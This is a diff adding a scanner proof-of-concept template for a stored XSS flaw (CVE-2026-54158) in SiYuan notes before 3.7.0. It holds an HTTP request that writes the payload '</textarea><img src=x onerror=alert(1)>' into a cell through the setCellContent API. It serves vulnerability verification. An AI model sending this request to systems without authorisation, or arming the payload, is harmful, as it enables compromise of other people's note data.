@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "验证 SiYuan 3.7.0 之前版本中 genAVValueHTML 函数未对 text/url/phone/mAsset 类型单元格内容进行 HTML 转义导致的存储型 XSS 漏洞。通过 API 向属性视图单元格写入突破标签的 XSS 载荷，验证未转义存储"
+id = "POC-AVE-2026-0489"
+name = "SiYuan 思源笔记 属性视图存储型XSS到远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2026-0489"]
+vuln_id = [
+    "CVE-2026-54158",
+    "AVE-2026-0489",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/av/setCellContent"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"avId":"test-av","rowId":"test-row","colId":"test-col","content":"</textarea><img src=x onerror=alert(1)>","type":"text"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["code"]
